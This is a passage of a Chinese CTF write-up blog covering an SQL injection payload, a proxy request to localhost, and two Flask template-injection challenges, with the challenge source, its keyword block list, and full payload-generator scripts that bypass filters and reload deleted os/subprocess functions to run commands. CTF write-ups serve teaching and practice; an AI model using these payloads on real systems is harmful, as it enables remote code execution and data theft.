class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>拼接后的sql语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> FATE <span class="hljs-keyword">FROM</span> FATETABLE <span class="hljs-keyword">WHERE</span> NAME<span class="hljs-operator">=</span><span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-built_in">UPPER</span>(<span class="hljs-string">&#x27;&#123;&quot;&#x27;</span>))))))) <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> FATE <span class="hljs-keyword">FROM</span> FATETABLE <span class="hljs-keyword">WHERE</span> NAME<span class="hljs-operator">=</span><span class="hljs-string">&#x27;LAMENTXU&#x27;</span> <span class="hljs-comment">--&quot;:1&#125;&#x27;)))))))</span><br></code></pre></td></tr></table></figure><p>即可成功注入。</p><p>接下来将传入的数据编码，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_binary</span>(<span class="hljs-params">input_string</span>):<br>    binary_list = [<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(char), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> input_string]<br>    binary_string = <span class="hljs-string">&#x27;&#x27;</span>.join(binary_list)<br>    <span class="hljs-keyword">return</span> binary_string<br><span class="hljs-built_in">print</span>(string_to_binary(<span class="hljs-string">&quot;&quot;&quot;&#123;&quot;name&quot;:&#123;&quot;&#x27;))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME=&#x27;LAMENTXU&#x27; --&quot;:1&#125;&#125;&quot;&quot;&quot;</span>))<br></code></pre></td></tr></table></figure><p>然后打就完了。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">GET /proxy?url=<span class="hljs-variable">@2130706433</span>:<span class="hljs-number">8080</span>/<span class="hljs-number">1337</span>?<span class="hljs-number">1</span>=<span class="hljs-numberspan><span class="hljs-variable">%260</span>=<span class="hljs-variable">%256</span>1<span class="hljs-variable">%256</span>2<span class="hljs-variable">%256</span>3<span class="hljs-variable">%256</span>4<span class="hljs-variable">%256</span>5<span class="hljs-variable">%256</span>6<span class="hljs-variable">%256</span>7<span class="hljs-variable">%256</span>8<span class="hljs-variable">%2569</span><br></code></pre></td></tr></table></figure><h2 id="Now-you-see-me-1"><a href="#Now-you-see-me-1" class="headerlink" title="Now you see me 1"></a>Now you see me 1</h2><p>源码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># YOU FOUND ME ;)</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   src.py</span><br><span class="hljs-string">@Time    :   2025/03/29 01:10:37</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> sys<br>enable_hook =  <span class="hljs-literal">False</span><br>counter = <span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">audit_checker</span>(<span class="hljs-params">event,args</span>):<br>    <span class="hljs-keyword">global</span> counter<br>    <span class="hljs-keyword">if</span> enable_hook:<br>        <span class="hljs-keyword">if</span> event <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;compile&quot;</span>]:<br>            counter += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> counter &gt; <span class="hljs-number">4</span>:<br>                <span class="hljs-keyword">raise</span> RuntimeError(event)<br><br>lock_within = [<br>    <span class="hljs-string">&quot;debug&quot;</span>, <span class="hljs-string">&quot;form&quot;</span>, <span class="hljs-string">&quot;args&quot;</span>, <span class="hljs-string">&quot;values&quot;</span>, <br>    <span class="hljs-string">&quot;headers&quot;</span>, <span class="hljs-string">&quot;json&quot;</span>, <span class="hljs-string">&quot;stream&quot;</span>, <span class="hljs-string">&quot;environ&quot;</span>,<br>    <span class="hljs-string">&quot;files&quot;</span>, <span class="hljs-string">&quot;method&quot;</span>, <span class="hljs-string">&quot;cookies&quot;</span>, <span class="hljs-string">&quot;application&quot;</span>, <br>    <span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-string">&#x27;url&#x27;</span> ,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <br>    <span class="hljs-string">&quot;getattr&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-string">&quot;&#123;&#123;&quot;</span>, <span class="hljs-string">&quot;&#125;&#125;&quot;</span>, <br>    <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;self&quot;</span>, <br>    <span class="hljs-string">&quot;lipsum&quot;</span>, <span class="hljs-string">&quot;cycler&quot;</span>, <span class="hljs-string">&quot;joiner&quot;</span>, <span class="hljs-string">&quot;namespace&quot;</span>, <br>    <span class="hljs-string">&quot;init&quot;</span>, <span class="hljs-string">&quot;dir&quot;</span>, <span class="hljs-string">&quot;join&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>, <br>    <span class="hljs-string">&quot;batch&quot;</span>, <span class="hljs-string">&quot;first&quot;</span>, <span class="hljs-string">&quot;last&quot;</span> , <br>    <span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;dict&quot;</span>,<span class="hljs-string">&quot;list&quot;</span>,<span class="hljs-string">&quot;g.&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;subprocess&quot;</span>,<br>    <span class="hljs-string">&quot;g|a&quot;</span>, <span class="hljs-string">&quot;GLOBALS&quot;</span>, <span class="hljs-string">&quot;lower&quot;</span>, <span class="hljs-string">&quot;upper&quot;</span>,<br>    <span class="hljs-string">&quot;BUILTINS&quot;</span>, <span class="hljs-string">&quot;select&quot;</span>, <span class="hljs-string">&quot;WHOAMI&quot;</span>, <span class="hljs-string">&quot;path&quot;</span>,<br>    <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;cat&quot;</span>, <span class="hljs-string">&quot;nl&quot;</span>, <span class="hljs-string">&quot;app&quot;</span>, <span class="hljs-string">&quot;setattr&quot;</span>, <span class="hljs-string">&quot;translate&quot;</span>,<br>    <span class="hljs-string">&quot;sort&quot;</span>, <span class="hljs-string">&quot;base64&quot;</span>, <span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-string">&quot;\\u&quot;</span>, <span class="hljs-string">&quot;pop&quot;</span>, <span class="hljs-string">&quot;referer&quot;</span>,<br>    <span class="hljs-string">&quot;The closer you see, the lesser you find.&quot;</span>] <br>        <span class="hljs-comment"># I hate all these.</span><br>app = flask.Flask(__name__)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;try /H3dden_route&#x27;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/H3dden_route&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r3al_ins1de_th0ught</span>():<br>    <span class="hljs-keyword">global</span> enable_hook, counter<br>    name = flask.request.args.get(<span class="hljs-string">&#x27;My_ins1de_w0r1d&#x27;</span>)<br>    <span class="hljs-keyword">if</span> name:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> name.startswith(<span class="hljs-string">&quot;Follow-your-heart-&quot;</span>):<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lock_within:<br>                    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> name:<br>                        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;NOPE.&#x27;</span><br>                enable_hook = <span class="hljs-literal">True</span><br>                a = flask.render_template_string(<span class="hljs-string">&#x27;&#123;#&#x27;</span>+<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span>&#x27;</span>+<span class="hljs-string">&#x27;#&#125;&#x27;</span>)<br>                enable_hook = <span class="hljs-literal">False</span><br>                counter = <span class="hljs-number">0</span><br>                <span class="hljs-keyword">return</span> a<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;My inside world is always hidden.&#x27;</span><br>        <span class="hljs-keyword">except</span> RuntimeError <span class="hljs-keyword">as</span> e:<br>            counter = <span class="hljs-number">0</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;NO.&#x27;</span><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Error&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Welcome to Hidden_route!&#x27;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">import</span> os<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">import</span> _posixsubprocess<br>        <span class="hljs-keyword">del</span> _posixsubprocess.fork_exec<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">import</span> subprocess<br>    <span class="hljs-keyword">del</span> os.popen<br>    <span class="hljs-keyword">del</span> os.system<br>    <span class="hljs-keyword">del</span> subprocess.Popen<br>    <span class="hljs-keyword">del</span> subprocess.call<br>    <span class="hljs-keyword">del</span> subprocess.run<br>    <span class="hljs-keyword">del</span> subprocess.check_output<br>    <span class="hljs-keyword">del</span> subprocess.getoutput<br>    <span class="hljs-keyword">del</span> subprocess.check_call<br>    <span class="hljs-keyword">del</span> subprocess.getstatusoutput<br>    <span class="hljs-keyword">del</span> subprocess.PIPE<br>    <span class="hljs-keyword">del</span> subprocess.STDOUT<br>    <span class="hljs-keyword">del</span> subprocess.CalledProcessError<br>    <span class="hljs-keyword">del</span> subprocess.TimeoutExpired<br>    <span class="hljs-keyword">del</span> subprocess.SubprocessError<br>    sys.addaudithook(audit_checker)<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br><br></code></pre></td></tr></table></figure><p>不是,全给过滤了🤡🤡🤡🤡</p><p>官方题解：</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/3392505-20250315170443488-1898201847.png" alt="img"></p><p>可以使用<code>request.endpoint</code>获取到当前路由的函数名，即<code>r3al_ins1de_th0ught</code></p><p>从中，我们能获取字符’d’, ‘a’, ‘t’</p><p>注意到可以拼接出data。进而获取<code>request.data</code>，再在请求体中传入任意字符进行绕过。至此，我们可以获得任意字符。</p><h3 id="importlib-reload"><a href="#importlib-reload" class="headerlink" title="importlib.reload"></a>importlib.reload</h3><p>可以看到题目删除了RCE的方法。python2中可以使用reload函数对类进行重载，在python3中，这个函数搬到了importlib类里。可以以此重载到被删除的方法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> importlib<br><span class="hljs-keyword">del</span> os.system<br>importlib.reload(os)<br>os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250414221615965.png" alt="image-20250414221615965"></p><h3 id="audithook"><a href="#audithook" class="headerlink" title="audithook"></a>audithook</h3><p>至于audithook是用来防奇怪的非预期的，不必在意。使用reload会触发一次complie和exec，再加上render_templete本身就有一次，一共正好4次。</p><p>在闭合注释符</p><p>闭合&#96;&#96;</p><p>最终利用<br>到此，我们已经可以构造任意字符，同时也可以恢复RCE类。我们依然使用request作入口类，通过继承链打RCE</p><p>总结如下：</p><ul><li>闭合注释语句</li><li>request.endpoint找request.data</li><li>request.data从请求体中获取任意字符</li><li>通过拼接字符打继承链找到importlib的reload。分别reloados.popen和subprocess.Popen</li><li>通过request打继承链找os打RCE</li></ul><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br>payload = []<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_rce_command</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    payloadstr = <span class="hljs-string">&quot;&#123;%set%0asub=request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;subprocess&#x27;)%&#125;&#123;%set%0aso=request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;os&#x27;)%&#125;&#123;%print(request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;importlib&#x27;)|attr(&#x27;reload&#x27;)(sub))%&#125;&#123;%print(request|attr(&#x27;application&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__builtins__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;__import__&#x27;)(&#x27;importlib&#x27;)|attr(&#x27;reload&#x27;)(so))%&#125;&#123;%print(so|attr(&#x27;popen&#x27;)(&#x27;&quot;</span> + cmd + <span class="hljs-string">&quot;&#x27;)|attr(&#x27;read&#x27;)())%&#125;&quot;</span><br><br>    required_encoding = re.findall(<span class="hljs-string">&#x27;\&#x27;([a-z0-9_ /\.]+)\&#x27;&#x27;</span>, payloadstr)<br>    <span class="hljs-comment"># print(required_encoding)</span><br><br>    offset_a = <span class="hljs-number">16</span><br>    offset_0 = <span class="hljs-number">6</span><br><br>    encoded_payloads = &#123;&#125;<br><br>    arg_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> required_encoding:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> encoded_payloads:<br>            p = []<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>                <span class="hljs-keyword">if</span> j == <span class="hljs-string">&#x27;_&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.2&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27; &#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.3&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;.&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.4&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;-&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.5&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j.isnumeric():<br>                    a = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>)+offset_0)<br>                    p.append(<span class="hljs-string">f&#x27;k.<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br>                <span class="hljs-keyword">elif</span> j == <span class="hljs-string">&#x27;/&#x27;</span>:<br>                    p.append(<span class="hljs-string">&#x27;k.68&#x27;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    a = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(j)-<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)+offset_a)<br>                    p.append(<span class="hljs-string">f&#x27;k.<span class="hljs-subst">&#123;a&#125;</span>&#x27;</span>)<br>            arg_name = <span class="hljs-string">f&#x27;a<span class="hljs-subst">&#123;arg_count&#125;</span>&#x27;</span><br>            encoded_arg = <span class="hljs-string">&#x27;&#123;%&#x27;</span> + <span class="hljs-string">&#x27;%0a&#x27;</span>.join([<span class="hljs-string">&#x27;set&#x27;</span>, arg_name , <span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>.join(p)]) + <span class="hljs-string">&#x27;%&#125;&#x27;</span><br>            encoded_payloads[i] = (arg_name, encoded_arg)<br>            arg_count+=<span class="hljs-number">1</span><br>            payload.append(encoded_arg)<br>    <span class="hljs-comment"># print(encoded_payloads)</span><br>    fully_encoded_payload = payloadstr<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encoded_payloads.keys():<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> fully_encoded_payload:<br>            fully_encoded_payload = fully_encoded_payload.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>+ i +<span class="hljs-string">&quot;&#x27;&quot;</span>, encoded_payloads[i][<span class="hljs-number">0</span>])<br>    <span class="hljs-comment"># print(fully_encoded_payload)</span><br>    payload.append(fully_encoded_payload)<br>command = <span class="hljs-string">&quot;whoami&quot;</span><br>payload.append(<span class="hljs-string">r&#x27;&#123;%for%0ai%0ain%0arequest.endpoint|slice(1)%&#125;&#x27;</span>)<br>word_data = <span class="hljs-string">&#x27;&#x27;</span><br>endpoint = <span class="hljs-string">&#x27;r3al_ins1de_th0ught&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;data&#x27;</span>:<br>    word_data += <span class="hljs-string">&#x27;i.&#x27;</span> + <span class="hljs-built_in">str</span>(endpoint.find(i)) + <span class="hljs-string">&#x27;~&#x27;</span><br>word_data = word_data[:-<span class="hljs-number">1</span>] <span class="hljs-comment"># delete the last &#x27;~&#x27;</span><br><span class="hljs-comment"># Now we have &quot;data&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data: &quot;</span>+word_data)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%set%0adat=&#x27;</span>+word_data+<span class="hljs-string">&#x27;%&#125;&#x27;</span>)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%&#125;&#x27;</span>)<br>generate_rce_command(command)<br><span class="hljs-comment"># payload.append(r&#x27;&#123;%print(j)%&#125;&#x27;)</span><br><span class="hljs-comment"># Here we use the &quot;data&quot; to construct the payload</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;request body: _ .-0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/&#x27;</span>)<br><span class="hljs-comment"># use chr() to convert the number to character</span><br><span class="hljs-comment"># hiahiahia~ Now we get all of the charset, SSTI go go go!</span><br><br>payload.append(<span class="hljs-string">r&#x27;&#123;%endfor%&#125;&#x27;</span>)<br>payload.append(<span class="hljs-string">r&#x27;&#123;%endfor%&#125;&#x27;</span>)<br>output = <span class="hljs-string">&#x27;&#x27;</span>.join(payload)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">r&quot;Follow-your-heart-%23&#125;&quot;</span>+output)<br></code></pre></td></tr></table></figure><p>可以看到成功RCE</p><p>后面的<code>misc</code>就不看了</p><h2 id="Now-you-see-me-2"><a href="#Now-you-see-me-2" class="headerlink" title="Now you see me 2"></a>Now you see me 2</h2><p>没有限制请求头回显，我们看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">print</span>(g|attr(<span class="hljs-string">&#x27;pop&#x27;</span>)|attr(<span class="hljs-string">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;setattr&#x27;</span>)(g|attr(<span class="hljs-string">&#x27;pop&#x27;</span>)|attr(<span class="hljs-string">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;sys&#x27;</span>)|attr(<span class="hljs-string">&#x27;modules&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;werkzeug&#x27;</span>)|attr(<span class="hljs-string">&#x27;serving&#x27;</span>)|attr(<span class="hljs-string">&#x27;WSGIRequestHandler&#x27;</span>),<span class="hljs-string">&#x27;server_version&#x27;</span>,g|attr(<span class="hljs-string">&#x27;pop&#x27;</span>)|attr(<span class="hljs-string">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)|attr(<span class="hljs-string">&#x27;get&#x27;</span>)(<span class="hljs-string">&#x27;__import__&#x27;</span>)(<span class="hljs-string">&#x27;os&#x27;</span>)|attr(<span class="hljs-string">&#x27;popen&#x27;</span>)(<span class="hljs-string">&#x27;&quot;&quot;&quot;+cmd+&quot;&quot;&quot;&#x27;</span>)|attr(<span class="hljs-string">&#x27;read&#x27;</span>)()))%&#125;<br><br></code></pre></td></tr></table></figure><p>使用上一题一模一样的策略打就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   exploit.py</span><br><span class="hljs-string">@Time    :   2025/01/27 17:46:11</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># Please fly little dreams.</span><br><br><span class="hljs-keyword">import</span> re<br>payload = []<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_rce_command</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-keyword">global</span> payload<br>    payloadstr = <span 